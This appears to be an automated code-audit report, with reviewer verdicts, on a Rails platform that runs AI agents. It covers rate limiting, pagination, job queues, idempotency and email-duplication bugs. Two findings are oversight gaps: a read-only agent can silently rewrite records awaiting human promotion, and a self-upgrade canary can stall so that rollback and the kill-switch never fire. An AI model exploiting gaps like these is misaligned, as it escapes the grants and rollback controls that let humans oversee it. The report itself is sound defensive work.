failure_or_value: Token brute-forcing/credential-stuffing against the production Render app is completely unthrottled, and a misconfigured agent stuck in a retry loop with an expired key (a real failure mode: keys have expires_at) hammers the DB with authenticate lookups at full speed with zero backpressure and no signal in the logs.
fix_sketch: Add a second, generous IP-keyed limiter declared BEFORE the authenticate before_action so it runs first: move `rate_limit to: 300, within: 1.minute, by: -> { request.remote_ip }, name: "pre_auth", with: -> {...}` above line 4, and keep the existing per-key limiter after auth (give it name: "per_key" so the two cache keys never collide). Also log a tagged warn line on 401 (token prefix attempted, IP) for observability. Purely additive; well-behaved agents never hit the IP cap.

verdict.reason: Re-read app/controllers/api/v1/base_controller.rb: before_action :authenticate_api_key! (line 4) is declared before rate_limit (line 6), and Rails rate_limit registers its throttle as a subsequent before_action; the 401 render in authenticate_api_key! halts the chain, so no unauthenticated request ever reaches the limiter. The `@api_key&.token_prefix || request.remote_ip` fallback (line 7) is provably dead code since @api_key is always present when the limiter runs. Each invalid-token request still costs SHA256 + an indexed DB lookup (api_key.rb:38-43), keys have expires_at (line 32), and there is no rack-attack in the Gemfile, no throttle initializer, and no other rate_limit in the app — so a broken agent looping on an expired key, or any scanner, hits the API/DB completely unthrottled while valid keys are capped at 100/min. The proposed pre-auth IP limiter + named per-key limiter is real, additive, and doesn't already exist. Caveat: actual token brute-force is impractical against long random SHA256'd tokens, so the value is backpressure/observability/DB protection rather than preventing key compromise — medium, not high.
verdict.ship_risk: Low and additive; touches_client_email=false and no API field changes (only a new 429 path for pre-auth abuse). Two things to get right: (1) the pre-auth IP limiter runs on EVERY request including authenticated ones, so if request.remote_ip resolved to Render's proxy/LB address instead of the true client IP, all agent traffic would share one 300/min bucket and legit round-the-clock agent polling could start 429ing — verify X-Forwarded-For/remote_ip resolution on Render before shipping and keep the cap generous; (2) give the two limiters distinct `name:` values (Rails keys the cache entry per controller+name) or they'd share a counter and effectively tighten the authenticated limit. Agents already must handle 429 from the existing per-key limiter, so a new pre-auth 429 for invalid-token loops is behavior clients should tolerate, and it actually surfaces (rather than masks) a stuck agent.

title: KnowledgeRecords#update skips the agent write-grant check that #create enforces
description: #create refuses a write when the acting agent's grants (AgentScopeResolver#allowed?) don't cover the domain/sensitivity/kind. #update only checks that the record is readable (readable_scope) and not canonical/superseded, then applies body/title/summary edits. Read grants and write grants are distinct in the resolver (action: :create vs read), so an agent granted read-only access to a domain can silently rewrite the body of any candidate/imported record in that domain — including candidates filed by other agents that are queued for human promotion to canonical.
failure_or_value: Agent with read-only grants on the operations domain PATCHes /api/v1/knowledge_records/:id with a new body -> the candidate a human is about to promote now contains content the agent was never allowed to write, with no grant check and no trace beyond updated_at. Undermines the candidate->human-promotion trust model.
fix_sketch: Mirror the create check in #update: if acting_agent && !agent_scope_resolver.allowed?(action: :update (or :create), domain: record.domain, sensitivity: record.sensitivity, kind: record.kind) -> 403 'Agent grants do not cover this write'. Optionally stamp last_modified_via (additive column/field) for audit. No serializer changes, so API compat is untouched.

verdict.reason: Re-read confirms every load-bearing claim. #create (knowledge_records_controller.rb:45-50) enforces agent_scope_resolver.allowed?(action: :create); #update (58-70) only requires the record be in readable_scope and non-canonical/non-superseded before update! of title/body/summary/tags/etc. PermissionResolver#readable_knowledge_scope filters on grants carrying the 'read' verb only, and PermissionGrant#covers? requires the specific action, so read grants do not imply write grants. Concrete inputs exist in the shipped seeds: every agent gets actions %w[read] on the shared operations domain (db/seeds.rb:450-452), so PATCH /api/v1/knowledge_records/:id?agent_slug=ari-legal with a new body against a candidate operations record succeeds (200) while POST to the same domain as the same agent is 403 (asserted at spec/requests/api/knowledge_records_spec.rb:79-87). No update-path grant spec exists, so the create/update asymmetry is untested and unintended. Severity capped at medium because agent_slug is caller-asserted on a shared brain:write bearer key and plain keys (no slug) bypass grant checks by design; this is a defense-in-depth gap that lets a confined/buggy agent corrupt other agents' pending candidates without audit trace, not a boundary an external attacker crosses.
verdict.ship_risk: Low. The fix is a server-side 403 added to #update; no serializer/field/schema changes, so /api/v1 backward compat is intact (purely additive behavior for a case that should never be exercised legitimately). touches_client_email=false; nothing near sponsor mail. One real compat caution: seeded agent grants contain 'read'/'create' but never the 'update' verb, so gating on allowed?(action: :update) would 403 ALL agent PATCHes, including any legitimate flow where a round-the-clock Ollama agent refines its own candidate before promotion (no in-repo caller PATCHes this endpoint, but external agents are not in-repo). Safer variants: check action: :create (matches the 'agents file candidates' semantics create already uses), or allow when allowed?(:update) OR (allowed?(:create) AND record.imported_from == acting_agent.slug). Add a request spec mirroring the create-denial spec, and consider the additive last_modified_via audit stamp separately. Watch prod 403 logs for a few days after deploy in case a scheduled routine was silently relying on the loose path.

title: WorkspaceRuns#index embeds every event's full stdout/stderr per run (N+1 + unbounded payload)
description: serialize_record is shared by #show and #index and includes "events" => record.events.order(:created_at) with full stdout/stderr for every event. The index scope only preloads :agent and :actor, so a default page of 25 runs fires 25 extra event queries and serializes every command's complete stdout/stderr — command output can be tens of KB each, so one polled index page can be multiple MB.
failure_or_value: Agents polling GET /api/v1/workspace_runs for status burn a page-of-25 x (1 query + full log payload) on every poll; response times and Render bandwidth degrade linearly with run history and log size, and Ollama-side agents waste context ingesting logs they didn't ask for.
fix_sketch: Two-part, both backward compatible: (1) add .includes(:events) to the index scope and sort the preloaded array in Ruby (record.events.sort_by(&:created_at)) to kill the N+1 without changing output; (2) add an additive opt-down param ?events=none|summary that omits or truncates stdout/stderr on index only when explicitly requested — default stays the full payload so existing consumers see zero change. Update the agents' polling helper to pass events=none.

verdict.reason: Re-read confirms both halves. (1) N+1: workspace_runs_controller.rb:9 preloads only :agent/:actor, and serialize_record (line 114) calls record.events.order(:created_at), which issues a fresh query per run — even .includes(:events) wouldn't help without the Ruby-side sort, and there is no includes(:events) today. render_many (base_controller.rb:153-157) maps serialize_record over a default page of 25 (base_controller.rb:127), so 25 extra queries per index poll, up to 100 at per_page=100. (2) Payload: serialize_event includes full stdout/stderr; writes are truncated at MAX_OUTPUT_CHARS=12,000 chars per stream (runner.rb:14), so ~24KB max per command event — the finding's 'tens of KB each' is accurate at the cap, though 'unbounded' slightly overstates per-event size. A run allows up to 8 command events + prepare + up to 25 edit events + a diff event, and serialize_record also ships artifacts containing a diff up to 60,000 chars (runner.rb:132), so a 25-run page can plausibly reach multiple MB for a status poll. Severity stays medium: it is a real perf/bandwidth/N+1 defect on a polled agent endpoint, not a correctness or security bug, and workspace_runs is a lower-traffic endpoint than tasks/deals.
verdict.ship_risk: Low. Part 1 (includes(:events) + Ruby sort) changes zero response bytes if the sort uses [created_at, id] — plain sort_by(&:created_at) could reorder same-timestamp events relative to Postgres's unspecified tie order, which is technically not a compat break but worth making deterministic. Part 2 (?events=none|summary) is purely additive with the full-payload default unchanged, so around-the-clock agent pollers see no difference until they opt in. No client-email surface anywhere on this path (touches_client_email=false is correct). Main residual risk is memory: includes(:events) loads all events for 25 runs into one Ruby process pass, but that is the same data currently loaded across 25 queries, so net neutral or better.

title: Concurrent idempotent replays 500 with unhandled RecordNotUnique instead of returning the existing record
description: Both idempotency implementations are find_by-then-create! backed by partial unique indexes (index_agent_runs_on_agent_id_and_external_id, index_tasks_on_external_ref). Two concurrent POSTs with the same external_id/external_ref race past the find_by; the loser raises ActiveRecord::RecordNotUnique, which no rescue_from in the base controller handles, so the caller gets a raw 500 instead of the documented idempotent_replay response. Retrying scheduled routines (exactly the clients that send external_id) are the ones most likely to double-fire. Side note: index_tasks_on_external_ref is globally unique rather than org-scoped, so a cross-org ref collision also surfaces as this 500.
failure_or_value: A routine that times out and retries its POST /api/v1/agent_runs while the first attempt is still committing gets a 500; its own error handling then re-retries or reports the run as failed even though it was recorded — exactly the flaky-agent noise the idempotency contract exists to prevent.
fix_sketch: Add rescue_from ActiveRecord::RecordNotUnique in Api::V1::BaseController that retries the lookup once (retry the action) or renders 409 with the existing record; simplest targeted fix: wrap the create! in each controller with rescue ActiveRecord::RecordNotUnique -> re-run the find_by and render the idempotent_replay response. Optionally add an org-scoped unique index on tasks (organization_id, external_ref) alongside the existing one (additive migration).

verdict.reason: Re-read confirms every element: Api::V1::BaseController (lines 10-32) rescues RecordNotFound/RecordInvalid/Pundit/ParameterMissing/ArgumentError but not ActiveRecord::RecordNotUnique, and it inherits directly from ActionController::API so nothing upstream catches it. Both idempotency paths are find_by-then-create! (agent_runs_controller.rb:17-26 via Agent#record_run! at agent.rb:131; tasks_controller.rb:39-58) backed by unique partial indexes (schema.rb:268 and :1729). Concrete failing input: two concurrent POST /api/v1/agent_runs with the same agent_slug+external_id (client-side timeout retry firing while attempt 1 is mid-transaction) — both pass the find_by AND the model uniqueness validation (winner uncommitted, invisible to the loser's SELECT), the loser's INSERT blocks on the index lock, winner commits, loser raises RecordNotUnique → raw 500 instead of the documented meta.idempotent_replay 200. Same race exists in find_or_register_agent! on agent slug. One correction to the finding: a cross-org tasks external_ref collision yields a handled 422 (RecordInvalid from the global model validation seeing the committed row), not a 500 — still wrong behavior vs the contract, but softer than claimed. Severity stays low because the common retry case (first attempt already committed) hits the find_by and correctly returns 200, so the failure window is only while the first attempt is in-flight, and the damage is one noisy 500 on an idempotent write, not data corruption.
verdict.ship_risk: Low. The targeted fix (rescue ActiveRecord::RecordNotUnique around each create!, re-run the find_by, render the existing idempotent_replay response) is purely additive: no API field renamed or removed, no schema change required, no client email anywhere near this path (touches_client_email=false). Two cautions: (1) prefer per-controller rescues over a blanket base-controller rescue_from that retries the action, since a global handler could mask unrelated unique violations elsewhere in /api/v1 and change their status codes for existing clients; (2) the optional org-scoped (organization_id, external_ref) index must be added ALONGSIDE the existing global index, not replace it — dropping index_tasks_on_external_ref would loosen a constraint agents currently rely on. If a 409 response is chosen instead of the 200 replay, that is a new status code polling agents have never seen; rendering the existing 200 idempotent_replay shape is the zero-compat-risk option.

title: Every API request writes an UPDATE to api_keys via touch_last_used!
description: authenticate_api_key! calls @api_key.touch_last_used! unconditionally, issuing an UPDATE api_keys SET last_used_at = now() on every single API request. Agents poll /api/v1/tasks, task_queue_health, approval_requests, etc. around the clock and pagination loops multiply the request count, so this is thousands of needless row updates per day per key — pure WAL/vacuum churn on the production Postgres for a field whose consumers only need minute-level freshness.
failure_or_value: Concrete value: cuts a hot, contended write path from every API call to at most one write per key per minute — lower WAL volume, less autovacuum pressure on Render Postgres, and one less lock point if two polls for the same key overlap. Zero behavior change for anything reading last_used_at.
fix_sketch: In touch_last_used!, skip the write when fresh: `return if last_used_at && last_used_at > 1.minute.ago; update_column(:last_used_at, Time.current)`. One-line change, covered by a model spec asserting no write within the window and a write after it.

verdict.reason: Re-read confirms every claim: base_controller.rb:45 unconditionally calls touch_last_used! as part of the authenticate before_action on every /api/v1 request, and api_key.rb:61-63 issues update_column(:last_used_at, Time.current) with no freshness guard. A second uncited per-request caller (lib/mcp/api_key_authenticated_transport.rb:14) would also be fixed by the model-level throttle. The only reader of last_used_at is time_ago_in_words in app/views/api_keys/index.html.erb:145, so minute-granularity is strictly sufficient — zero observable behavior change. The sole existing spec (spec/models/api_key_spec.rb:125-128) starts from nil and still passes with the guard. Severity stays low: with a 3-person org, few keys, and a 100 req/min rate limit, worst case is ~100 HOT updates/min/key — real WAL/autovacuum churn but modest at this scale.
verdict.ship_risk: Very low. No client email involved (touches_client_email=false). No API field renamed/removed and no schema change, so agent pollers and DB consumers are unaffected. update_column already skips callbacks and updated_at. Only behavioral delta: last_used_at can lag up to 1 minute, which the admin UI ("less than a minute ago") cannot distinguish. Two cautions for the implementer: (1) the in-memory @api_key from ApiKey.authenticate is freshly loaded per request, so the guard reads current DB state — no staleness trap; (2) tests that freeze time and touch twice would see the second call no-op, but no such test exists today. Recommend one added model spec asserting skip-within-window and write-after-window, then run the full suite.

title: Renewals and nested list endpoints return unbounded, unpaginated arrays
description: The house rule (and agent memory) is 'list APIs cap at 100/page with meta.has_more', but GET /api/v1/renewals maps the entire scope with heavy per-deal serialization (fulfillment_summary, signals), and within_days is caller-controlled with no upper bound (?within_days=100000 serializes every won deal ever). Nested indexes (contracts, stakeholders, deal deliverables) and newsletter_slots also dump full arrays. These are bounded by business size today, but renewals grows monotonically with every closed-won deal as the $1M push succeeds, and the endpoint is on agents' scheduled read paths.
failure_or_value: Concrete value: keeps the renewal book endpoint fast and cheap as the won-deal count grows past a few hundred, and gives agents the same meta.page/has_more contract they already implement everywhere else instead of a payload that silently grows unbounded. Also removes the ?within_days=<huge> accidental full-table dump.
fix_sketch: Additive only: route renewals through the existing render_many/paginate helper (keep the meta.within_days and count keys, add page/per_page/has_more/total_count alongside), and cap within_days at e.g. 730 with a 400 above it. Nested per-deal indexes are naturally small; lowest priority — paginate them only if convenient. Existing consumers that never send ?page get page 1 with per_page default 25; if that default-size change is too risky for renewals consumers, default per_page to 100 there.

verdict.reason: Re-read all five cited controllers; every factual claim holds. (1) app/controllers/api/v1/renewals_controller.rb:24-41 maps the entire scope with no limit/offset, and lines 26-28 accept any positive within_days (`?within_days=100000` moves the cutoff ~274 years out, serializing every closed-won deal with a contract_end_date — concrete input, real path). (2) The house pagination helper genuinely exists and is unused here: base_controller.rb:125-135 (`paginate`, 25 default / 100 cap, has_more via +1 fetch) and :153 (`render_many`). (3) Worse than the finding states: the renewals index preloads :contracts/:case_file_entries/:account_signals but NOT :newsletter_placements or :contract_deliverables, and deal.rb:191-211 (`fulfillment_summary`) loads both per deal — so each renewal row fires extra queries, an N+1 that scales with the won-deal book. (4) Nested indexes (deals/contracts_controller.rb:24, deal_stakeholders_controller.rb:7-11, deals/deliverables_controller.rb:20-26) and newsletter_slots_controller.rb:29-37 do dump full arrays, though these are naturally small (per-deal children; slots bounded by date range) — correctly ranked lowest priority. One wrinkle the fix must respect: newsletter_slots applies its status filter in Ruby AFTER serialization (line 35), so DB-level pagination there would yield variable-size pages; skip or restructure that one. Confirmed as a real, feasible, additive upgrade with the helper already built; severity stays low because today's dataset is tens of won deals and the endpoint is auth-gated (deals:read), so the unbounded param is a footgun, not an exposed DoS.
verdict.ship_risk: No client-email surface (touches_client_email=false is correct — read-only CRM data, no mailers). Main risk is API backward-compat for round-the-clock agent pollers: if renewals starts paginating with the default per_page=25 and an agent routine reads the endpoint without ?page expecting the FULL renewal book, it silently sees a truncated book — a data-integrity regression worse than the perf issue it fixes. Mitigate exactly as the sketch says: default per_page to 100 on this endpoint (today's book fits in one page), keep meta.within_days and meta.count unchanged, add page/per_page/has_more/total_count alongside (additive only). Capping within_days with a 400 above 730 technically changes behavior for huge values, but no in-repo consumer sends within_days at all (rg finds no callers outside the controller), so blast radius is near zero; grep agent prompts/schedules in prod before shipping to be safe. Leave newsletter_slots unpaginated or handle its post-serialization Ruby status filter carefully to avoid inconsistent page sizes.

title: Long agent runs share the single 2-thread default worker with the 2-minute outbound send sweeps — approved emails can wait tens of minutes
description: queue.yml gives everything except Slack one catch-all worker: queues "*", threads: 2, processes: ENV JOB_CONCURRENCY (default 1). That same pool runs multi-minute jobs (ScheduledAgentRunJob's AskSavant model call, AgentFlowStepJob with a 15-minute per-invocation cap, WorkspaceRunJob, AgentEvalNightlyJob which the header says 'takes several minutes') AND the latency-critical recurring sweeps: SendApprovedDraftsJob every 2 minutes (the thing that actually sends a draft after Brian taps Approve on his phone), SlackSessionRecoverySweepJob, and AgentScheduleDispatcherJob.
failure_or_value: Concrete value: today, two concurrent long agent runs (e.g. a scheduled inbox sweep plus an AgentFlow step, or the 4am eval overlapping a routine) occupy both threads; every 2-minute SendApprovedDraftsJob tick queues behind them, so an email Brian approved sits unsent for 15-30+ minutes with no indication why. Splitting queues makes approve-to-send latency deterministic (~2 min) regardless of agent load — directly visible to Brian on mobile.
fix_sketch: Additive queue split, no job renames: (1) in queue.yml add a dedicated worker block `queues: "outbound,default"` (or a separate `outbound`-only worker) with its own threads, and keep a `queues: "agents"` worker for long work; (2) set `queue_as :outbound` on SendApprovedDraftsJob, SendOutreachEmailJob, SendContractForSigningJob, SendFullyExecutedContractEmailJob, and `queue_as :agents` on ScheduledAgentRunJob, AgentFlowStepJob, WorkspaceRunJob, AgentEvalNightlyJob, VoiceCalibrationJob; (3) update recurring.yml queue keys to match. Verify with the full suite plus a manual check that mission_control shows the new queues draining.

verdict.reason: Every cited fact re-verified on the real code. config/queue.yml:11-14 gives all non-Slack work one wildcard worker with threads: 2 and processes defaulting to 1; render.yaml (the actual prod deploy) sets no JOB_CONCURRENCY, and bin/render-worker:19 starts Solid Queue in async mode with that config, so prod has exactly 2 threads. All 33 non-Slack job classes are queue_as :default with no priorities. The long occupants are real: AgentFlowStepJob holds a thread up to 15 minutes per invocation (MAX_SECONDS_PER_RUN, app/jobs/agent_flow_step_job.rb:14), ScheduledAgentRunJob runs a full AskSavant model loop (app/jobs/scheduled_agent_run_job.rb:64-69), AgentEvalNightlyJob self-documents as taking several minutes, and the wildcard worker also polls the slack queue so long Slack agent turns compete for the same 2 threads (worse than the finding claimed). SendApprovedDraftsJob is enqueued only by the 2-minute recurring tick (config/recurring.yml:47-50); tasks_controller#approve performs no send and no enqueue, and its flash literally promises 'about 2 minutes.' Concrete failure: any two overlapping long agent jobs (e.g. 7:30am drift heartbeat plus a scheduled inbox sweep, or one 15-minute AgentFlowStepJob invocation plus one ScheduledAgentRunJob) occupy both threads and a phone-approved email waits 10-30 minutes with no explanation. The upgrade does not already exist and is high-leverage for Brian's core approve-on-phone loop.
verdict.ship_risk: Low-to-moderate, no client-email exposure (SendApprovedDraftsJob and the contract/outreach jobs are existing approved-send paths; the change only reroutes queues, it enables no new sends) and no API field changes (queue names are internal to Solid Queue). Specific risks: (1) a queue-name typo would strand jobs silently, so the existing wildcard "*" worker must be KEPT as a backstop rather than replaced with an exact-name list; (2) recurring.yml entries carry their own queue: key which overrides queue_as for scheduled enqueues, so both must be updated together or the sweep stays on the contended pool; (3) adding a worker block adds threads on the 2GB Render worker, slightly raising memory and DB-pool pressure (RAILS_MAX_THREADS=10 pool gives headroom, but verify after deploy); (4) bin/render-worker runs async mode, so confirm the extra worker block actually spawns under mode: :async in staging/mission_control before trusting it. Verify with the full green suite plus a prod check that the new queue drains and approve-to-send stays ~2 minutes during an active agent run.

title: A worker death mid ScheduledAgentRunJob leaves the AgentRun stuck 'running' forever — the routine silently skips and no failure alert ever fires
description: ScheduledAgentRunJob marks the AgentRun status: :running (line 56), then makes a minutes-long AskSavant model call (line 69). If the worker dies mid-call (Render deploy restart, OOM — and deploys are frequent: 19 PRs shipped in July), Solid Queue marks the job failed with ProcessPrunedError but does NOT re-run it, and nothing in the codebase ever touches that AgentRun again: it stays 'running' with finished_at nil. record_failure only runs on an in-process raise. ScheduledRunFailureAlertJob (which files the failure card) is only enqueued from within this job, so it never fires. AgentScheduleDispatcherJob already has exactly this recovery pattern for flows (resume_stale_agent_flows, lines 26-34) but nothing equivalent for scheduled runs.
failure_or_value: Failure: a deploy lands at 7:44am while the 7:45am S&W LinkedIn routine's run is mid-model-call. The run row stays 'running' forever, Brian gets no DM, no delivery-failure card, no failure alert — the sweep just didn't happen and nobody knows. Bonus hazard: the stuck run has finished_at nil, so a Mission Control retry of the pruned job passes the `run.persisted? && run.finished_at.present?` guard (line 50) and re-executes the whole agent, repeating any external actions (Slack DMs, send_mail) the first attempt completed before dying.
fix_sketch: Add a sweep to AgentScheduleDispatcherJob#perform mirroring resume_stale_agent_flows: `AgentRun.where(status: :running).where("external_id LIKE 'agent-schedule:%'").where(started_at: ..(now - 1.hour))` → update!(status: :failed, error: "worker died mid-run (stale running sweep)", finished_at: Time.current) and enqueue ScheduledRunFailureAlertJob.perform_later(run.id). That both surfaces the skipped routine on the Tasks board and closes the re-execution window (a retried job then no-ops on the finished_at guard). Pick the threshold above the longest legitimate run (check run_stats).

verdict.reason: Re-read confirms every claim. ScheduledAgentRunJob saves the run status=running/finished_at=nil (lines 54-62) before a minutes-long model call (line 69); record_failure only fires on an in-process raise, so a worker death (deploy restart/OOM) strands the run as 'running' forever. The codebase's own comments (slack_session_recovery_sweep_job.rb:4-8) confirm ProcessPrunedError worker deaths are a real recurring event in this deployment, and Solid Queue does not auto-retry pruned jobs. Exhaustive search shows no recovery path for stuck AgentRuns: the dispatcher sweeps only AgentFlow, the Slack sweep covers AgentSession/AgentTask, and ScheduledRunFailureAlertJob is enqueued only from inside the job that died — so the routine silently vanishes with no card, no DM, no alert. Bonus hazard verified: the line-51 guard requires finished_at.present?, so a manual retry of the pruned job re-executes the whole agent, repeating non-idempotent side effects (Slack DMs, mail) the first attempt completed. The fix (stale-running sweep in AgentScheduleDispatcherJob mirroring resume_stale_agent_flows, mark failed + enqueue ScheduledRunFailureAlertJob) matches two existing house patterns, is additive, and rides existing dedup/flap-suppression. Severity stays high: silent loss of Brian's scheduled routines is exactly the failure class this product exists to prevent, and deploys are frequent.
verdict.ship_risk: Low. Purely additive: a new sweep inside an existing internal job, no schema change, no API field changes, no client-facing email (ScheduledRunFailureAlertJob files internal task cards to the schedule's actor only, and already has per-run dedup + 6h flap suppression). Main risk is a threshold set below the longest legitimate run: the sweep would mark a still-in-flight run failed and file a spurious failure card; the in-flight job's later run.update! self-heals the status but the noise card remains, so derive the threshold from actual run_stats durations (flows use 30min; 1h+ is the safe floor). The sweep does not cancel the in-flight job, so no double-delivery risk beyond what exists today.

title: SendOutreachEmailJob marks ambiguous timeouts :failed (double-send risk) and a crash mid-send strands the email in :sending with zero surfacing or recovery path
description: Two gaps versus its hardened sibling SendApprovedDraftsJob: (1) the rescue at line 27 treats every MicrosoftGraphClient::Error/GmailMailboxClient::Error as a hard failure and marks :failed — including errors whose cause is Faraday::TimeoutError, where the request may have been delivered and only the response lost. SendApprovedDraftsJob explicitly carves this out (send_approved_drafts_job.rb:235) because a timeout is ambiguous. (2) claim_for_sending flips :queued → :sending before delivery; a worker kill between claim and the :sent update leaves the record :sending forever. There is no sweeper for stale :sending rows, AgentDriftMonitor doesn't watch them, and even a Mission Control retry no-ops because the claim only accepts :queued — the record is permanently unrecoverable through the job.
failure_or_value: Failure (1): Graph times out after actually delivering a sponsor outreach email; record shows 'failed'; Brian (or an agent reading /api/v1) composes and sends again → the sponsor contact gets the same cold email twice. Failure (2): a deploy restart mid-delivery leaves the email :sending; the outreach Brian queued never goes out, the deal shows outreach as in-flight forever, and nothing tells anyone.
fix_sketch: (1) In the delivery rescue, branch on `e.cause.is_a?(Faraday::TimeoutError)`: keep delivery_status :sending (or a new additive enum value like `unconfirmed: 7` — append-only, never renumber per the model comment) and set delivery_error to an 'ambiguous timeout — verify Sent folder before resending' message instead of :failed. (2) Add a recurring sweep (can live inside SendApprovedDraftsJob's 2-minute tick or a new small job) that finds `OutboundEmail.sending.where(sent_at: ..10.minutes.ago)` and files a Task card ('outreach send unconfirmed — check the Sent folder') exactly like SendApprovedDraftsJob#hold_for_unconfirmed_send!. Never auto-resend from the sweep.

verdict.reason: Both gaps hold on re-read. (1) send_outreach_email_job.rb:27-30 marks :failed for every MicrosoftGraphClient::Error/GmailMailboxClient::Error with no timeout carve-out; both clients re-raise Faraday::Error (which includes Faraday::TimeoutError, cause preserved) as their Error class (microsoft_graph_client.rb:233-234, gmail_mailbox_client.rb:172-173), so an ambiguous post-delivery timeout shows as 'failed' and invites a duplicate sponsor send — the sibling SendApprovedDraftsJob carves out exactly this at send_approved_drafts_job.rb:235 and holds for a human instead. (2) claim_for_sending (lines 43-52) only claims :queued, so a worker kill between the :sending flip (line 47) and the :sent update (line 15) strands the row: a Solid Queue re-run no-ops on the claim guard, no code anywhere queries stale OutboundEmail :sending rows (verified: only crm/deal_activity, process_inbound_email_job, user.rb, event.rb touch the model), no monitor covers it, and OutreachEmailsController has no resend action. Severity trimmed to medium because both triggers are low-probability (a 30s Graph timeout, or a kill inside a seconds-wide window) and the double-send additionally requires a manual re-send decision — but when either fires the outcome (duplicate sponsor cold email, or outreach Brian queued silently never going out) is real and invisible.
verdict.ship_risk: Low if scoped as sketched, with two watch-items. Client email: the fix must only change status bookkeeping and file an internal Task card ('check the Sent folder') — never auto-resend from the sweep and never touch SponsorPortalMailer/SponsorAssetReminderService; a resend-on-timeout 'fix' would be the dangerous variant (it converts an ambiguous timeout into a guaranteed double-send to a sponsor contact). API/schema compat: delivery_status is an integer-backed enum with live rows and is read by agents/UI (crm/deal_activity maps status names to values), so if a new 'unconfirmed' value is added it must be appended (7+) per the model comment, and consumers that switch on the status string must tolerate the new value — keeping the row in :sending with a descriptive delivery_error is the zero-compat-risk option. Also note claim_for_sending stamps sent_at at claim time (line 47), so the proposed sweep query on sent_at works as written; a sweep threshold that is too tight could generate noisy Task cards on slow sends, so keep the 10-minute grace.

title: SendFullyExecutedContractEmailJob has no durable once-only marker — any duplicate enqueue or Mission Control retry re-emails the sponsor the executed contract
description: The job's only guard is `return unless contract.fully_executed?` (line 12), which stays true forever once executed, so every re-run re-enqueues the sponsor email (line 22). The job's own rescue comment admits the hazard ('Do NOT re-run this job (it would re-email the sponsor)') but relies on a human reading a log line. Two enqueue sites exist (client signing at contract_signing_controller.rb:79 and countersign at contracts_controller.rb:183); more concretely, if `contract.deal.move_to_stage!(:closed_won)` (line 27) raises after the mailers are enqueued, the job lands in Mission Control's failed set with the emails already sent, and the obvious operator move — clicking Retry — double-emails the sponsor.
failure_or_value: Failure: post-send bookkeeping raises (deal validation, stage-transition guard), job shows failed, operator retries it (or a future dev adds a retry_on) → the sponsor receives the 'fully executed contract' email twice. This is an existing, legally-necessary transactional client email; the fix only prevents duplicates, adds no new client sends.
fix_sketch: Additive migration: `add_column :contracts, :executed_email_enqueued_at, :datetime`. In the job, inside `contract.with_lock`: return if the column is set; set it and save BEFORE the deliver_later calls (mirroring SendApprovedDraftsJob's claim-before-send pattern). A re-run then no-ops regardless of why it re-ran. Keep the existing rescue logging. Also apply the same stamp check at both controller enqueue sites if double-enqueue is possible there.

verdict.reason: Re-read confirms every load-bearing claim. The job's only guard (send_fully_executed_contract_email_job.rb:12, `return unless contract.fully_executed?`) is permanently true once executed (contract.rb:85-87), and no durable marker column exists in db/schema.rb. Concrete post-send raise: Contract `belongs_to :deal, optional: true` (contract.rb:12), so a fully-executed contract with nil deal_id makes line 27 `contract.deal.move_to_stage!(:closed_won)` raise NoMethodError AFTER both deliver_later calls (lines 22-23) enqueued; `move_to_stage!` also uses save! (deal.rb:112-116) so an otherwise-invalid deal raises RecordInvalid on the same line. mission_control-jobs IS in the Gemfile (line 30), so the operator Retry button is a real one-click re-email of the executed contract to the sponsor. The job's own rescue comment (lines 28-43) concedes the hazard and relies on a human reading a log. Bonus confirmed path: the countersign enqueue site (contracts_controller.rb:181-183) has no with_lock (unlike the client-signing path at contract_signing_controller.rb:35-45), so concurrent double-POST can enqueue the job twice. The fix pattern (claim-before-send inside with_lock) already exists verbatim in SendApprovedDraftsJob#claim_for_send, so the sketch is feasible and idiomatic for this codebase. Severity stays medium: needs a post-send failure plus a retry, and the harm is a duplicate legitimate transactional email, not data loss.
verdict.ship_risk: Low but touches a sponsor-facing transactional send path (touches_client_email=true in the audit sense). The email itself is a pre-existing, sanctioned contract-execution send; the fix adds NO new client email and keeps all banned sponsor mail off. Risks to manage: (1) stamp ordering — the executed_email_enqueued_at claim must be set AFTER ContractPdfGenerator succeeds but BEFORE deliver_later, otherwise the existing retry_on Ferrum::Error becomes a no-op and a transient Chrome failure would permanently swallow the sponsor email; (2) tiny claim-then-crash window — if the process dies between stamp commit and deliver_later, the email is never sent (same accepted tradeoff as SendApprovedDraftsJob; mitigate by logging the stamp and keeping the loud rescue). Migration is purely additive (one nullable datetime column), no /api/v1 fields renamed or removed, no agent-visible schema breakage. Backfill note: stamp existing fully-executed contracts at migration time so old failed jobs can never be retried into a send.

title: Self-upgrade canary chain has no backstop: one unexpected raise or a worker kill mid-check permanently strands the canary, so a degraded deploy never rolls back
description: The whole self-upgrade pipeline advances only via self-re-enqueue (SelfUpgradeCanaryJob#requeue line 75; SelfUpgrades::Runner enqueues SelfUpgradeStepJob with wait: 2.minutes). SelfUpgradeCanaryJob rescues only RenderClient::ConfigurationError (line 61) and RenderClient::Error (line 67). Any other StandardError — a transient Postgres error in `upgrade.update!(canary_failures: 0)`, a nil from record_evidence!, a bug in healthy? outside its internal rescue — kills the job with no retry_on and no next link in the chain. Same for a SIGKILL while the job is executing (Solid Queue marks the claimed execution failed via ProcessPrunedError and does not retry) — and the canary is by definition running during a deploy restart of the very worker it runs on. The GitHub Actions watchdog covers only total-death (app/queue down), not a healthy queue with a dead chain.
failure_or_value: Failure: mid-canary, the upgraded deploy restarts the worker while the canary check is executing → chain dead → upgrade stuck in :canary forever, the degraded-agent rollback and kill-switch freeze never engage, and a bad self-merged change stays live with nobody alerted. This defeats the exact safety property the canary exists for.
fix_sketch: Two layers: (1) add `rescue StandardError => e` to SelfUpgradeCanaryJob#perform that logs and `requeue(upgrade, wait: 3.minutes) if upgrade&.canary?` (same shape as the existing RenderClient::Error rescue). (2) Add a chain-repair sweep to the every-minute AgentScheduleDispatcherJob, mirroring resume_stale_agent_flows: for each SelfUpgrade in status canary/sandboxing/shipping with updated_at older than ~10 minutes, re-enqueue the matching job (SelfUpgradeCanaryJob or SelfUpgradeStepJob — both are documented idempotent polls, so a redundant enqueue is harmless).

